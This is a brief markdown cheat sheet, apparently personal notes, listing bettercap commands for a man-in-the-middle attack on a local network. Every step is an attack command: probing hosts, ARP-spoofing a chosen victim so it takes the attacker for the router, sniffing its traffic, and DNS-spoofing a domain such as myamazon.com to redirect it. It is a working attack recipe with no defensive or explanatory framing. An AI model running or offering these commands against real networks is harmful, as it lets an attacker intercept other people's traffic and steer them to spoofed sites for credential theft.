# ARP Spoofing

start bettercap

```
$ sudo bettercap
```

start locating the devices in the network

```bash
net.probe on
```

list all the devices on the network

```
net.show
```

- Let the victim think that it's talking to the router

```
set arp.spoof.targets <IP>

arp.spoof on
```

- Enable sniffer mode

```
net.sniff on
```


## Redirection of websites

```
net.sniff off
```

```
set dns.spoof.domains myamazon.com
```

```
dns.spoof on
```